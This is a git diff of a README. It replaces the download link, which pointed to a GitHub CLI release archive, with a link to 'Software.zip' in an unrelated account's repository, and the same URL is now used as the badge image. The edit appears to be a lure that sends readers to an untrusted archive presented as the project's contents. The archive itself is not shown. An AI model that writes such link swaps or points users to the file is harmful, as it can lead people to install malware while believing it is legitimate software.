@@ -18,7 +18,7 @@ This repository does not specify any topics, but the content within covers a wid
 
 ## Download Link
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Now](https://github.com/Mar813-spec/222/releases/download/v1.0/Software.zip)](https://github.com/Mar813-spec/222/releases/download/v1.0/Software.zip)
 
 Click the button above to download the contents of this repository. 📥
 
